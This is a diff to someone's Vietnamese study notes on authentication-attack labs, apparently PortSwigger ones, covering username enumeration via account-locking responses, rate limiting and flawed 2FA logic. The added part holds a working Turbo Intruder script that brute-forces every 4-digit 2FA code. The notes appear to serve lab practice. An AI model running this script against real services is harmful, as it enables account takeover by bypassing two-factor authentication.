@@ -16,4 +16,32 @@ lập danh sách user (chèn wiener)
 
 
 -Account locking
-Tìm user name bằng cách thử xem res nào phản hồi về số lần thử mật khẩu của user đó quá nhiều => cos username => sniper nữa là xong  
+Tìm user name bằng cách thử xem res nào phản hồi về số lần thử mật khẩu của user đó quá nhiều => cos username => sniper nữa là xong  (Chia nhỏ gói ra mới chạy clust bomber được, burp free như cac à)
+
+
+-User rate limiting
+
+-HTTP basic authentication
+
+-Flawed two-factor verification logic
+
+def queueRequests(target, wordlists):
+    engine = RequestEngine(
+        endpoint=target.endpoint,
+        concurrentConnections=5,
+        requestsPerConnection=100,
+        pipeline=True
+    )
+
+    # brute từ 0000 đến 9999
+    for i in range(10000):
+        code = str(i).zfill(4)   # pad thành 4 số
+        engine.queue(target.req, code)
+
+
+def handleResponse(req, interesting):
+    # hiện tất cả request/response ra bảng Turbo Intruder
+    table.add(req)
+
+
+dungf turbo intruder, đúng vip sì líp :DDDDDDDD
